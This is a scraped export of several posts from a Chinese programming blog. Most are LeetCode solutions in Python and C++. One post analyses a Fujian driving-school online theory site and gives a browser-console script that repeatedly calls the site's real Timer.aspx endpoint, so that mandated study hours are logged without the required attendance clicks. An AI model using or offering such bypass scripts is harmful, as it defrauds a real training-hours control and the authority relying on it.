写几个数字(secret)，让你猜（guess），如果guess中数字的位置和secret的位置一样，那么就是bull，如果guess中数字为secret中一样，但是有出现，则为cows。 现在给你secret和guess串，让你返回bull和cows的个数。 思路 相同位置数字相同的个数就是bull，这个不用解释~ 那么cows怎么算呢? 统计下同一位置下但是数字不同种secret数字出现的个数，然后就可以用guess中同一位置数字不同，看在secret中是否出现~ 1234567891011121314151617181920class Solution(object): def getHint(self, secret, guess): &quot;&quot;&quot; :type secret: str :type guess: str :rtype: str &quot;&quot;&quot; if not secret or not guess: return &#x27;0A0B&#x27; bulls, cows, digits = 0, 0, [0 ] * 10 for i in xrange(len(secret)): if secret[i] == guess[i]: bulls += 1 else: digits[int(secret[i])] += 1 for i in xrange(len(secret)): if secret[i] != guess[i] and digits[int(guess[i])] != 0: cows += 1 digits[int(guess[i])] -= 1 return str(bulls) + &#x27;A&#x27; + str(cows) + &#x27;B&#x27;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"剑走偏锋 福建驾考刷网上理论学时 无需20分钟点击方法","slug":"fujian-drive-license-online-study-time-20-minute-click-crack","date":"2015-11-03T15:26:18.000Z","updated":"2020-10-22T14:31:03.904Z","comments":true,"path":"fujian-drive-license-online-study-time-20-minute-click-crack/","link":"","permalink":"https://www.hrwhisper.me/fujian-drive-license-online-study-time-20-minute-click-crack/","excerpt":"今天水过科目二，=v= 100分~ 教练让刷科三网上理论的学时，科二两小时的网上学时也就算了，科三16小时= =还要20分钟点击一次，考个驾照这么麻烦。。难道要挂个按键精灵？那我岂不是4小时不能动电脑= = 太low了，身为CS学生，当然要找直接粗暴一点=v=","text":"今天水过科目二，=v= 100分~ 教练让刷科三网上理论的学时，科二两小时的网上学时也就算了，科三16小时= =还要20分钟点击一次，考个驾照这么麻烦。。难道要挂个按键精灵？那我岂不是4小时不能动电脑= = 太low了，身为CS学生，当然要找直接粗暴一点=v= 伸手党请直接拉到最下方看方法~ 分析 直接查看其JS代码，很容易发现stage标示的是科目几，如科三是3，科二为2 12345678910111213141516171819202122232425262728293031323334$(&quot;#ChapterMenuDivOne1&quot;).click(function () &#123; //$.cookie(&#x27;stlx&#x27;, null); // $.cookie(&#x27;jishi&#x27;, &#x27;False&#x27;); stage = 1; timer(); $(&#x27;body&#x27;).stopTime(&#x27;C&#x27;); &#125;) $(&quot;#ChapterMenuDivOne2&quot;).click(function () &#123; // $.cookie(&#x27;stlx&#x27;, null); // $.cookie(&#x27;jishi&#x27;, &#x27;False&#x27;); stage = 2; timer(); //先跑一次 fjTimer(); fj20(); // window.frames[0].document.onkeydown = kk; // window.frames[0].document.onmousedown = kk; &#125;) $(&quot;#ChapterMenuDivOne3&quot;).click(function () &#123; // $.cookie(&#x27;stlx&#x27;, null); // $.cookie(&#x27;jishi&#x27;, &#x27;False&#x27;); stage = 3; timer(); //先跑一次 fjTimer(); fj20(); // window.frames[0].document.onkeydown = kk; // window.frames[0].document.onmousedown = kk; &#125;) 可以看到，科二和科三就差了stage - - 我们直接看科三的，调用了如下函数 timer(); fjTimer(); fj20(); timer()函数如下： 123456789function timer() &#123; $.get(&quot;Timer.aspx?Stage=&quot;+stage, function (d) &#123; $(&quot;#OnlineNumberDiv&quot;).html(d); &#125;) .error(function () &#123; $(&quot;#OnlineNumberDiv&quot;).html(&quot;&lt;b style=&#x27;color:red&#x27;&gt;网络故障，请刷新页面！&lt;/b&gt;&quot;); //location.href=&#x27;http://www.17qibu.cn&#x27; &#125;) &#125; 可以看出，这是个计算时间的函数，用get向服务器请求，然后 OnlineNumberDiv显示更新学时的时间，如下图 driving licence update time fjTimer()函数如下： 123456789function fjTimer() &#123; if (isTimer == 0) &#123; $(&#x27;body&#x27;).stopTime(&#x27;A&#x27;); $(&#x27;body&#x27;).everyTime(&#x27;60s&#x27;, &#x27;A&#x27;, function () &#123; timer(); &#125;); isTimer = 1; &#125; &#125; 每60S刷新一次timer() fj20()函数如下： 12345678910111213function fj20() &#123; $(&#x27;body&#x27;).stopTime(&#x27;C&#x27;); // if ($.cookie(&#x27;jishi&#x27;) == &#x27;True&#x27;) &#123; $(&#x27;body&#x27;).oneTime(&#x27;1810s&#x27;, &#x27;C&#x27;, function () &#123; $(&#x27;body&#x27;).stopTime(&#x27;C&#x27;); // $(&#x27;body&#x27;).stopTime(&#x27;A&#x27;); //弹出随堂练习题 fjDialog(); &#125;); // &#125; &#125; 就是1810S后调用fjDialog(); fjDialog(); 如下 123456789101112131415161718192021222324 function fjDialog() &#123; var html = &#x27;&lt;p id=&quot;stopTimeTips&quot;&gt;计时将在&lt;b style=&quot;color:blue&quot; id=&quot;remainTime&quot; &gt;加载中&lt;/b&gt;后停止，请问是否需要继续学习？&lt;/p&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&#x27;; html += &quot;&lt;input type=button value=&#x27; 是(继续学习) &#x27; onclick=\\&#x27;startTimer()\\&#x27; /&gt; &quot;; html += &#x27;&lt;input type=button value=&quot; 否(返回首页) &quot; onclick=&quot;gotoIndex()&quot; /&gt;&#x27;; // $.get(&quot;fj20.aspx?zhangjie=&quot; + $.cookie(&#x27;stlx&#x27;) + &quot;&amp;r=&quot; + Math.random(), function (html) &#123; bbq = new Dialog(html); bbq.show(); // &#125;); // bbq = new Dialog(html);// bbq.show(); //计时倒计时========================= SysSecond = 120; //这里获取倒计时的起始时间 $(&#x27;body&#x27;).stopTime(&#x27;D&#x27;); $(&#x27;body&#x27;).everyTime(&#x27;1s&#x27;, &#x27;D&#x27;, function () &#123; SetRemainTime(); &#125;); //InterValObj = window.setInterval(SetRemainTime, 1000); //间隔函数，1秒执行 //计时倒计时:end===================== &#125; 就是弹出那个学时停止计时确认的对话框，如果120S不点击继续学习，则进行停止计时 123456789101112131415161718192021222324function SetRemainTime() &#123; if (SysSecond &gt; 0) &#123; SysSecond = SysSecond - 1; var second = Math.floor(SysSecond % 60); // 计算秒 var minite = Math.floor((SysSecond / 60) % 60); //计算分 $(&quot;#remainTime&quot;).html(minite + &quot;分&quot; + second + &quot;秒&quot;); &#125; else &#123; timer(); $(&#x27;body&#x27;).stopTime(&#x27;D&#x27;); $(&#x27;body&#x27;).stopTime(&#x27;A&#x27;); isTimer = 0; $(&#x27;body&#x27;).stopTime(&#x27;C&#x27;); if (stage == 2) &#123; $(&quot;#stopTimeTips&quot;).html(&quot;&lt;b style=&#x27;color:red&#x27;&gt;计时已于&quot; + currentTime() + &quot;停止，若需继续学习请点击“是”&lt;/b&gt;&quot;); &#125; else &#123; $(&quot;#stopTimeTips&quot;).html(&quot;&lt;b style=&#x27;color:red&#x27;&gt;计时已于&quot; + currentTime() + &quot;停止，请点击上面的选项继续学习。&lt;/b&gt;&quot;); &#125; &#125; &#125; 效果如图 driving licence stop time 从上面的分析中得出结论，timer()函数用于计时，而它是用get方法向/Timer.aspx?Stage=3刷新计时时间的。 那么，如果我们直接向这个发送请求呢？答案是可行的，请看下面的方法 方法 打开chrome浏览器，访问科三的学习页面，按F12，打开控制台，输入如下代码，回车即可。 12345setInterval(function()&#123;$.get(&#x27;http://fj.17qibu.cn:8001/Timer.aspx?Stage=3&#x27;, function (d) &#123; $(&quot;#OnlineNumberDiv&quot;).html(d); &#125;)&#125;, 6000); 如图 driving-licence-stop-time-chrome-console-js PS： 这个方法并不会阻止弹窗说停止计时，但无视就好=v=,还是会继续计时的。 如果是科目二，那么把Stage=3改为Stage=2 每天只能挂4个小时，这是硬性限制= = 有控制台的能跑JS的浏览器就行，不一定得chrome 2015.11.05 update code:使得能直接在网页上显示更新的学时 driving-licence-stop-time-but-continue-update-time 可以在我的学时中查看详细学时记录，会发现还是计时的。 driving licence my rest time 小结 本来是想要python 直接上模拟登陆和提交- -没想到计时的机制这么简单~","categories":[{"name":"技术改变生活","slug":"技术改变生活","permalink":"https://www.hrwhisper.me/categories/%E6%8A%80%E6%9C%AF%E6%94%B9%E5%8F%98%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"Cool","slug":"Cool","permalink":"https://www.hrwhisper.me/tags/Cool/"},{"name":"Javascript","slug":"Javascript","permalink":"https://www.hrwhisper.me/tags/Javascript/"}]},{"title":"leetcode Longest Increasing Subsequence","slug":"leetcode-longest-increasing-subsequence","date":"2015-11-03T09:12:27.000Z","updated":"2021-01-08T13:32:16.853Z","comments":true,"path":"leetcode-longest-increasing-subsequence/","link":"","permalink":"https://www.hrwhisper.me/leetcode-longest-increasing-subsequence/","excerpt":"leetcode Longest Increasing Subsequence Given an unsorted array of integers, find the length of longest increasing subsequence. For example, Given [10, 9, 2, 5, 3, 7, 101, 18], The longest increasing subsequence is [2, 3, 7, 101], therefore the length is 4. Note that there may be more than one LIS combination, it is only necessary for you to return the length. Your algorithm should run in O(n2) complexity. Follow up: Could you improve it to O(n log n) time complexity?","text":"leetcode Longest Increasing Subsequence Given an unsorted array of integers, find the length of longest increasing subsequence. For example, Given [10, 9, 2, 5, 3, 7, 101, 18], The longest increasing subsequence is [2, 3, 7, 101], therefore the length is 4. Note that there may be more than one LIS combination, it is only necessary for you to return the length. Your algorithm should run in O(n2) complexity. Follow up: Could you improve it to O(n log n) time complexity? 题目地址：leetcode Longest Increasing Subsequence 题意 给定一个数组，求最长上升子序列。 思路 方法一： dp[i] 为 以 A[i]结尾的LIS，那么对于dp[i]有dp[i] =max( dp[j] + 1) [ 0&lt;= j &lt; i, nums[j] &lt; nums[i] ] 效率为O(n^2) 方法二： dp[i] 为 以 A[i]结尾的LIS ， g(i) = min ( A[j]) ( dp[j] = i) 即g(i)表示上升子序列为i，结尾最小的值。 比如，1，2，4，3中A[3] = 3 那么显然， g(1) &lt;= g(2) &lt;=……g(n) 我们可以用二分搜索查找满足g(k) &gt;= A[i]的第一个下标k，则dp[i] = k ，此时 A[i] &lt;= g(k) ， 而dp[i] =k，所以更新g(k) = A[i] python O(n^2) 1234567891011121314class Solution(object): def lengthOfLIS(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; if not nums: return 0 n = len(nums) dp = [1] * n for i in xrange(1, n): for j in xrange(i): if nums[i] &gt; nums[j] and dp[i] &lt; dp[j] + 1: dp[i] = dp[j] + 1 return max(dp) python O(nlogn) 123456789101112131415161718192021222324class Solution(object): def lengthOfLIS(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; if not nums: return 0 n = len(nums) dp, g = [1] * n, [sys.maxint] * (n + 2) for i in xrange(n): k = self.lower_bound(1,n+1,nums[i],g) dp[i] = k g[k] = nums[i] return max(dp) def lower_bound(self,L, R, x,g): while L &lt; R: mid = (L + R) &gt;&gt; 1 if g[mid] &lt; x: L = mid + 1 else: R = mid return L","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"Gephi 安装后 打不开解决办法","slug":"can-not-open-gephi-solution","date":"2015-10-29T11:28:20.000Z","updated":"2020-10-19T14:35:48.726Z","comments":true,"path":"can-not-open-gephi-solution/","link":"","permalink":"https://www.hrwhisper.me/can-not-open-gephi-solution/","excerpt":"今天安装了Gephi后，发现打开就显示下欢迎界面，就消失了。","text":"今天安装了Gephi后，发现打开就显示下欢迎界面，就消失了。 原因是需要 java JDK 7的版本，8的不行！ 所以如果你没安装JDK 7就安装下，安装了8就卸了装7吧。 下载地址如下 http://www.oracle.com/technetwork/java/javase/downloads/jdk7-downloads-1880260.html","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"问题解决","slug":"others/问题解决","permalink":"https://www.hrwhisper.me/categories/others/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"}],"tags":[]},{"title":"leetcode Find Median from Data Stream","slug":"leetcode-find-median-from-data-stream","date":"2015-10-21T09:08:23.000Z","updated":"2021-01-08T13:32:16.840Z","comments":true,"path":"leetcode-find-median-from-data-stream/","link":"","permalink":"https://www.hrwhisper.me/leetcode-find-median-from-data-stream/","excerpt":"leetcode Find Median from Data Stream Median is the middle value in an ordered integer list. If the size of the list is even, there is no middle value. So the median is the mean of the two middle value. Examples: [2,3,4] , the median is 3 [2,3], the median is (2 + 3) / 2 = 2.5 Design a data structure that supports the following two operations: void addNum(int num) - Add a integer number from the data stream to the data structure. double findMedian() - Return the median of all elements so far. For example: add(1) add(2) findMedian() -&gt; 1.5 add(3) findMedian() -&gt; 2","text":"leetcode Find Median from Data Stream Median is the middle value in an ordered integer list. If the size of the list is even, there is no middle value. So the median is the mean of the two middle value. Examples: [2,3,4] , the median is 3 [2,3], the median is (2 + 3) / 2 = 2.5 Design a data structure that supports the following two operations: void addNum(int num) - Add a integer number from the data stream to the data structure. double findMedian() - Return the median of all elements so far. For example: add(1) add(2) findMedian() -&gt; 1.5 add(3) findMedian() -&gt; 2 题目地址： leetcode Find Median from Data Stream 题意： 要求设计一个数据结构，支持实时插入，和实时查询中位数。 思路： O(n)插入，O(1)查询的方法很简单，直接一个数组，每次插入排序。。。。这里不做介绍。 O(logn)插入，O(1)查询：建立一个最大堆和最小堆，思路是这两个堆顶指向中间的元素，这样可以达到O(1)查询。 最大堆负责存储这些数左边的，最小堆则负责右边的。每次插入时候判断是插入左边还是右边，然后看看是否要平衡一下两个堆的元素个数。 以 1，2，3，4插入为例，最大堆命名为small（因为是左边的元素），最小堆为large 1进来，放进small 轮到2，仍然放进small，但是small的元素比large多2，不平衡，于是取出2放入large 轮到3，3比large的2来得大，直接放入large 轮到4，4比large的2来得大，直接放入large，但是large的元素比small多2，不平衡，于是取出2放入small 查询时，根据个数大小判断应该是返回small还是large的。 个数相等则说明为偶数个，返回均值。 实现上我用了priority_queue，这个是个最大堆，所以右边的（large）插入取相反数。 C++ 123456789101112131415161718192021222324252627class MedianFinder &#123; priority_queue&lt;int&gt; small, large;public: // Adds a number into the data structure. void addNum(int num) &#123; if (!large.empty() &amp;&amp; -large.top() &lt; num) large.push(-num); else small.push(num); if (small.size() - large.size() == 2) &#123; large.push(-small.top()); small.pop(); &#125; else if (small.size() - large.size() == -2) &#123; small.push(-large.top()); large.pop(); &#125; &#125; // Returns the median of current data stream double findMedian() &#123; if (small.size() &gt; large.size()) return small.top(); else if (small.size() &lt; large.size()) return -large.top(); return (small.top() - large.top()) / 2.0; &#125;&#125;; 看了discuss有比我简单的代码，不过比我慢。毕竟做了无用的push和pop 1234567891011121314151617181920class MedianFinder &#123; priority_queue&lt;long&gt; small, large;public: void addNum(int num) &#123; small.push(num); large.push(-small.top()); small.pop(); if (small.size() &lt; large.size()) &#123; small.push(-large.top()); large.pop(); &#125; &#125; double findMedian() &#123; return small.size() &gt; large.size() ? small.top() : (small.top() - large.top()) / 2.0; &#125;&#125;; 剑指offer也有这题，下面是我刷《剑指offer》时写的代码 c++ 12345678910111213141516171819202122232425262728class MedianFinder &#123; priority_queue&lt;int&gt; left; priority_queue&lt;int&gt; right;public: MedianFinder() &#123;&#125; void addNum(int num) &#123; if (left.empty() || num &lt;= left.top()) &#123; left.push(num); if (right.size() + 1 &lt; left.size()) &#123; int temp = left.top(); left.pop(); right.push(-temp); &#125; &#125; else &#123; // num &gt; left.top() right.push(-num); if (right.size() &gt; left.size()) &#123; int temp = right.top(); right.pop(); left.push(-temp); &#125; &#125; &#125; double findMedian() &#123; return (left.size() + right.size()) &amp; 1? left.top() : (left.top() - right.top()) * 0.5; &#125;&#125;; Python 12345678910111213141516171819class MedianFinder: def __init__(self): self.left = [] self.right = [] def addNum(self, num: int) -&gt; None: if not self.left or -self.left[0] &gt; num: heapq.heappush(self.left, -num) if len(self.right) + 1 &lt; len(self.left): temp = heapq.heappop(self.left) heapq.heappush(self.right, -temp) else: heapq.heappush(self.right, num) if len(self.right) &gt; len(self.left): temp = heapq.heappop(self.right) heapq.heappush(self.left, -temp) def findMedian(self) -&gt; float: return -self.left[0] if (len(self.left) + len(self.right)) &amp; 1 else (-self.left[0] + self.right[0]) * 0.5","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Nim Game","slug":"leetcode-nim-game","date":"2015-10-13T00:23:56.000Z","updated":"2021-01-08T13:32:16.856Z","comments":true,"path":"leetcode-nim-game/","link":"","permalink":"https://www.hrwhisper.me/leetcode-nim-game/","excerpt":"leetcode Nim Game You are playing the following Nim Game with your friend: There is a heap of stones on the table, each time one of you take turns to remove 1 to 3 stones. The one who removes the last stone will be the winner. You will take the first turn to remove the stones. Both of you are very clever and have optimal strategies for the game. Write a function to determine whether you can win the game given the number of stones in the heap. For example, if there are 4 stones in the heap, then you will never win the game: no matter 1, 2, or 3 stones you remove, the last stone will always be removed by your friend.","text":"leetcode Nim Game You are playing the following Nim Game with your friend: There is a heap of stones on the table, each time one of you take turns to remove 1 to 3 stones. The one who removes the last stone will be the winner. You will take the first turn to remove the stones. Both of you are very clever and have optimal strategies for the game. Write a function to determine whether you can win the game given the number of stones in the heap. For example, if there are 4 stones in the heap, then you will never win the game: no matter 1, 2, or 3 stones you remove, the last stone will always be removed by your friend. 题目地址： leetcode Nim Game 题意: Nim游戏，n个石头，两个玩家轮流玩，每次只能拿掉1个或者2个或者3块石头，直到不能拿的一方算输。 现在给定石头个数n，求先拿者是否会赢得这个游戏？ 思路: 简单的博弈论题。 下面的讨论对先拿者而言： 因为一次可以拿1~3个石头，所以n=1 ，2，3时候是必胜状态，因为你一次可以拿完。 而4是必败状态，因为你第一次无论拿 几块，对手都可以一次拿完。（你拿1块，对手拿3个；你拿2块，对手拿2块；你拿3块，对手拿1块） 而5，6，7则是必胜状态，因为你一次可以拿到剩下4个，让对手进入必败状态。 同理，8是必败状态，无论拿几个，对手都进入了5，6，7的必胜状态..... 9，10，11必胜，因为可以拿到剩下8块给对手,12为必败....... 总结：能被4整除的必败，否则必胜。 代码很简单，一行搞定 C++ 123456class Solution &#123;public: bool canWinNim(int n) &#123; return n % 4 != 0; &#125;&#125;; Python 1234567class Solution(object): def canWinNim(self, n): &quot;&quot;&quot; :type n: int :rtype: bool &quot;&quot;&quot; return n % 4 !=0","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Word Pattern","slug":"leetcode-word-pattern","date":"2015-10-06T01:41:24.000Z","updated":"2021-01-08T13:32:16.888Z","comments":true,"path":"leetcode-word-pattern/","link":"","permalink":"https://www.hrwhisper.me/leetcode-word-pattern/","excerpt":"leetcode Word Pattern Given a pattern and a string str, find if str follows the same pattern. Examples: pattern = \"abba\", str = \"dog cat cat dog\" should return true. pattern = \"abba\", str = \"dog cat cat fish\" should return false. pattern = \"aaaa\", str = \"dog cat cat dog\" should return false. pattern = \"abba\", str = \"dog dog dog dog\" should return false. Notes: Both pattern and str contains only lowercase alphabetical letters. Both pattern and str do not have leading or trailing spaces. Each word in str is separated by a single space. Each letter in pattern must map to a word with length that is at least 1.","text":"leetcode Word Pattern Given a pattern and a string str, find if str follows the same pattern. Examples: pattern = \"abba\", str = \"dog cat cat dog\" should return true. pattern = \"abba\", str = \"dog cat cat fish\" should return false. pattern = \"aaaa\", str = \"dog cat cat dog\" should return false. pattern = \"abba\", str = \"dog dog dog dog\" should return false. Notes: Both pattern and str contains only lowercase alphabetical letters. Both pattern and str do not have leading or trailing spaces. Each word in str is separated by a single space. Each letter in pattern must map to a word with length that is at least 1. 题目地址： leetcode Word Pattern 题意： 给定一个模式串和一个字符串，判断模式串是否符合字符串的描述。 如， 模式串为abba ,字符串为dog cat cat dog 返回true 模式串为abba ,字符串为dog cat cat fish 返回false 模式串和字符串只有小写字母，开头和结尾都没有多余的字符 在字符串中所有单词被一个空格划分 模式串必须匹配字符串至少长度为1的单词 思路： 先把字符串根据空格划分。 接着我采用双字典的方式，分别记录最后出现的下标，详见代码吧，很好理解的 1234567891011121314151617181920212223class Solution(object): def wordPattern(self, pattern, str): &quot;&quot;&quot; :type pattern: str :type str: str :rtype: bool &quot;&quot;&quot; str = str.split() str_index , pattern_index = &#123;&#125;,&#123;&#125; n = len(pattern) if n != len(str): return False for i in xrange(n): if pattern[i] in pattern_index: if str[pattern_index[pattern[i]]] != str[i]: return False else: if str[i] in str_index: return False str_index[str[i]] = i pattern_index[pattern[i]] = i return True","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Find the Duplicate Number","slug":"leetcode-find-the-duplicate-number","date":"2015-10-05T12:45:12.000Z","updated":"2021-01-08T13:32:16.844Z","comments":true,"path":"leetcode-find-the-duplicate-number/","link":"","permalink":"https://www.hrwhisper.me/leetcode-find-the-duplicate-number/","excerpt":"leetcode Find the Duplicate Number Given an array nums containing n + 1 integers where each integer is between 1 and n (inclusive), prove that at least one duplicate number must exist. Assume that there is only one duplicate number, find the duplicate one. Note: You must not modify the array (assume the array is read only). You must use only constant, O(1) extra space. Your runtime complexity should be less than O(n2). There is only one duplicate number in the array, but it could be repeated more than once.","text":"leetcode Find the Duplicate Number Given an array nums containing n + 1 integers where each integer is between 1 and n (inclusive), prove that at least one duplicate number must exist. Assume that there is only one duplicate number, find the duplicate one. Note: You must not modify the array (assume the array is read only). You must use only constant, O(1) extra space. Your runtime complexity should be less than O(n2). There is only one duplicate number in the array, but it could be repeated more than once. 题目地址：leetcode Find the Duplicate Number 题意： 给定一个n + 1个数的数组，数组中每个元素的值介于1~n，假设只有一个元素是重复的，求这个元素 你不能修改这个数组 空间复杂度要求O(1) 时间复杂度小于O(n2) 只有一个元素是重复的，但可能重复不止一次 思路： 因为时间复杂度要求要小于O(n2), 所以不能用朴素的判别。 空间复杂度O(1)所以不能hash，不能修改所以不能排序,可能不止重复一次所以不能n项和 所以，怎么做呢？ 方法一：二分 我们知道，这总共n + 1 个数每个数x都满足 1 &lt;= x &lt;= n 所以，我们二分答案为 mid = (L+R )/2 其中 L=1 R= n 然后扫描整个数组进行统计 ，设cnt为满足不大于mid的元素个数，则有：cnt &lt;= mid 则说明重复的应该在 [mid , R] ，否则，应该在[L,mid] 总的时间复杂度为O(nlogn) 12345678910111213141516class Solution(object): def findDuplicate(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; L, R = 1, len(nums) - 1 while L &lt;= R: mid = (L + R) &gt;&gt; 1 cnt = sum([1 for num in nums if num &lt;= mid]) if cnt &lt;= mid: L = mid + 1 else: R = mid - 1 return L 方法二： 双指针 如果数组中元素不重复，那么,任意下标i和数组中该下标的值一一对应，如 对于数组 3,4,1,2，有如下对应关系：（注意，值从1~n） 0 - &gt; 2 1 -&gt; 4 2 -&gt; 1 3 -&gt; 3 设这个对应关系的运算函数为f(n) ，那么，我们从下标0出发，每次根据f取出下标i对应的值x，并将这个x作为下一次的下标，直到下标越界。 如3，4，1，2这个数组，那么有 0 - &gt; 2-&gt; 1-&gt; 4 但如果有重复的话，中间就会产生多个映射，如3,4,1,2,3 0 - &gt; 2 1 -&gt; 4 2 -&gt; 1 3 -&gt; 3 4 -&gt;3 继续这么做的话，会发生 0 - &gt; 2-&gt; 1-&gt; 4 -&gt; 3 -&gt; 3-&gt;3…… 也就是最后一定是那个重复的元素。 这样类似于 leetcode 142 Linked List Cycle II一样，找链表环路的起点，我们先用快慢两个下标都从0开始，快下标每轮运算两次，慢下标每轮运算一次，直到两个下标再次相同。这时候保持快下标位置不变，将慢下标移动到0，接着两个每轮分别运算一次，当这两个下标相遇时，就是环的起点，也就是重复的数。 原因详见 142. Linked List Cycle II 时间复杂度为O(n) 12345678910111213141516class Solution(object): def findDuplicate(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; slow , fast = nums[0] , nums[nums[0]] while slow != fast: slow = nums[slow] fast = nums[nums[fast]] slow = 0 while slow != fast: slow = nums[slow] fast = nums[fast] return slow","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Game of Life","slug":"leetcode-game-of-life","date":"2015-10-04T09:32:15.000Z","updated":"2021-01-08T13:32:16.847Z","comments":true,"path":"leetcode-game-of-life/","link":"","permalink":"https://www.hrwhisper.me/leetcode-game-of-life/","excerpt":"leetcode Game of Life According to the Wikipedia's article: \"The Game of Life, also known simply as Life, is a cellular automaton devised by the British mathematician John Horton Conway in 1970.\" Given a board with m by n cells, each cell has an initial state live (1) or dead (0). Each cell interacts with its eight neighbors (horizontal, vertical, diagonal) using the following four rules (taken from the above Wikipedia article): Any live cell with fewer than two live neighbors dies, as if caused by under-population. Any live cell with two or three live neighbors lives on to the next generation. Any live cell with more than three live neighbors dies, as if by over-population.. Any dead cell with exactly three live neighbors becomes a live cell, as if by reproduction. Write a function to compute the next state (after one update) of the board given its current state. Follow up: Could you solve it in-place? Remember that the board needs to be updated at the same time: You cannot update some cells first and then use their updated values to update other cells. In this question, we represent the board using a 2D array. In principle, the board is infinite, which would cause problems when the active area encroaches the border of the array. How would you address these problems?","text":"leetcode Game of Life According to the Wikipedia's article: \"The Game of Life, also known simply as Life, is a cellular automaton devised by the British mathematician John Horton Conway in 1970.\" Given a board with m by n cells, each cell has an initial state live (1) or dead (0). Each cell interacts with its eight neighbors (horizontal, vertical, diagonal) using the following four rules (taken from the above Wikipedia article): Any live cell with fewer than two live neighbors dies, as if caused by under-population. Any live cell with two or three live neighbors lives on to the next generation. Any live cell with more than three live neighbors dies, as if by over-population.. Any dead cell with exactly three live neighbors becomes a live cell, as if by reproduction. Write a function to compute the next state (after one update) of the board given its current state. Follow up: Could you solve it in-place? Remember that the board needs to be updated at the same time: You cannot update some cells first and then use their updated values to update other cells. In this question, we represent the board using a 2D array. In principle, the board is infinite, which would cause problems when the active area encroaches the border of the array. How would you address these problems? 题目地址：leetcode Game of Life 题意： 给定一个m*n的矩阵，根据生命游戏的规则求下一个时刻这个矩阵的状态 生命游戏的规则如下（邻居均为八个方向）： 活的细胞的邻居少于2个是活的，这个细胞会孤独致死 活的细胞的邻居有2~3个是活的，这个细胞下一刻还是活的 活的细胞邻居超过3个是活的，这个细胞会死亡 死的细胞人邻居有3个是活的，这个细胞下一刻也会复活 思路： 说白了仅有当活的细胞邻居2~3个是活的，这个细胞下一次才是活的，死的细胞邻居3个活的，下一刻这个细胞也是活的 所以写出如下代码： 1234567891011121314151617181920212223242526272829class Solution(object): def countLiveNeighbors(self, i, j, m, n, board): dx = [1, 1, 1, 0, 0, -1, -1, -1] dy = [1, 0, -1, 1, -1, 1, 0, -1] cnt = 0 for k in xrange(8): nx, ny = i + dx[k], j + dy[k] if nx &lt; 0 or ny &lt; 0 or nx &gt;= m or ny &gt;= n: continue if board[nx][ny] == 1: cnt += 1 return cnt def gameOfLife(self, board): &quot;&quot;&quot; :type board: List[List[int]] :rtype: void Do not return anything, modify board in-place instead. &quot;&quot;&quot; temp = copy.deepcopy(board) m, n = len(board), len(board[0]) for i in xrange(m): for j in xrange(n): cnt = self.countLiveNeighbors(i, j, m, n, temp) if temp[i][j]: if not (cnt == 2 or cnt == 3): board[i][j] = 0 else: # temp[i][j] ==0 if cnt == 3: board[i][j] = 1 Follow up: 如果不开一个辅助的数组呢? 我们假设有4个状态，比如2表示一开始为1，但是之后应该为0的状态，3表示一开始为0，但是之后为1 的状态，总结状态如下： 0 : 0 -&gt; 0 1 : 1 -&gt; 1 2 : 1 -&gt; 0 3 : 0 -&gt; 1 